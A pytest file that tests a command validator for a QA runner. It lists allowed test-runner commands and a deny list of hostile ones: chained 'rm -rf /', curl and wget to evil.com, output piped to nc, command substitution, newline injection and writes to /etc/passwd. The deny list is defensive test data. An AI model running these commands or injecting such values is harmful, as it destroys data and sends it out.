import pytest

from app.qa.runner import validate_command, CommandValidationError


SAFE_COMMANDS = [
    "pytest",
    "pytest -q",
    "python -m pytest tests/",
    "npm test",
    "npm run test:unit",
    "gradlew.bat test",
    "go test ./...",
    "cargo test --release",
    "dotnet test",
    "pytest --maxfail=1 -k 'not slow'",
]

UNSAFE_COMMANDS = [
    "pytest; rm -rf /",
    "pytest && curl evil.com",
    "pytest || curl evil.com",
    "pytest | nc 1.2.3.4 80",
    "rm -rf /",
    "powershell -c whoami",
    "pwsh -c whoami",
    "cmd /c dir",
    "bash -c ls",
    "sh -c ls",
    "pytest $(whoami)",
    "pytest `whoami`",
    "pytest ${HOME}",
    "pytest > /etc/passwd",
    "pytest < /etc/passwd",
    "pytest\nrm -rf /",
    "pytest\r\nrm -rf /",
    "curl http://evil.com",
    "wget http://evil.com",
    "chmod 777 /",
    "sudo rm -rf /",
    "",
    "   ",
]


@pytest.mark.parametrize("cmd", SAFE_COMMANDS)
def test_safe_commands_are_allowed(cmd):
    assert validate_command(cmd) == cmd


@pytest.mark.parametrize("cmd", UNSAFE_COMMANDS)
def test_unsafe_commands_are_rejected(cmd):
    with pytest.raises(CommandValidationError):
        validate_command(cmd)


def test_denied_executable_with_path_prefix_is_rejected():
    with pytest.raises(CommandValidationError):
        validate_command("/usr/bin/rm -rf /")


def test_denied_executable_with_exe_suffix_is_rejected():
    with pytest.raises(CommandValidationError):
        validate_command("powershell.exe -c whoami")
